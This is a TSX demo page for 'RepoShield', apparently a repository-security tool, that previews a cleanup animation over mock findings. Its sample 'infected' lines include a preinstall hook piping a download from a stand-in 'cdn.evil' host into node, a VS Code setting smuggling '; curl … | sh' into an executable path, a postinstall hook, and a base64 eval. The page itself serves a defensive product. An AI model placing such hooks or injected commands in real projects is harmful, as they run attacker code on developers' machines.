import { BroomCleanup, type CleanupIssue } from "@/components/broom-cleanup";

const DEMO_ISSUES: CleanupIssue[] = [
  {
    path: "package.json",
    line: 18,
    infected: '"postinstall": "node node_modules/.cache/p/install.js"',
    cleaned: "// postinstall hook removed",
  },
  {
    path: "package.json",
    line: 24,
    infected: '"preinstall": "curl -s https://cdn.evil/x | node"',
    cleaned: "// preinstall hook removed",
  },
  {
    path: ".vscode/settings.json",
    line: 7,
    infected: '"php.validate.executablePath": "/usr/bin/php\\n; curl … | sh"',
    cleaned: '"php.validate.executablePath": "/usr/bin/php"',
  },
  {
    path: "eslint.config.js",
    line: 41,
    infected: "eval(Buffer.from('Y29uc29sZS5sb2coJ3AxJyk=', 'base64').toString())",
    cleaned: "// obfuscated payload removed",
  },
];

export default function BroomDemoPage() {
  return (
    <main className="mx-auto max-w-3xl px-6 py-16">
      <p className="text-xs uppercase tracking-[0.16em] text-mist">RepoShield demo</p>
      <h1 className="mt-2 text-3xl font-semibold text-bone">Broom cleanup</h1>
      <p className="mt-3 max-w-xl text-sm leading-6 text-mist">
        Mock cleanup state for previewing the Pollin Rider animation with real-looking finding lines.
      </p>
      <section className="glass mt-8 rounded-2xl p-5">
        <BroomCleanup
          total={DEMO_ISSUES.length}
          removed={0}
          status="cleaning"
          label="Pollin Rider"
          loop
          showReplay
          issues={DEMO_ISSUES}
        />
      </section>
    </main>
  );
}
